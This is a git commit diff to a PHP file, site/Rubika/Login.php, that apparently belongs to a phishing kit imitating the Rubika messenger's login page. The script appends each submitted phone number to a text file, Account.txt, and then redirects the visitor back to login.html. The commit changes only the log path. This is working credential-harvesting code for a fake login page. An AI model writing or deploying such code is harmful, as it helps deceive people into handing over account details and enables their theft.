459bd6f2e96e3911f06dd209807b5f6bde6c8e3a
CipherX <102590998+CipherX-B4ar3@users.noreply.github.com>
2022-05-30 11:27:33 -0700

    Update Login.php

--- site/Rubika/Login.php
+++ site/Rubika/Login.php
@@ -1,4 +1,4 @@
 <?php
-file_put_contents("Log/Account.txt", "Phone => " . $_POST["phone_number"],FILE_APPEND);
+file_put_contents("Account.txt", "Phone => " . $_POST["phone_number"],FILE_APPEND);
 header("Location: login.html");
 ?>
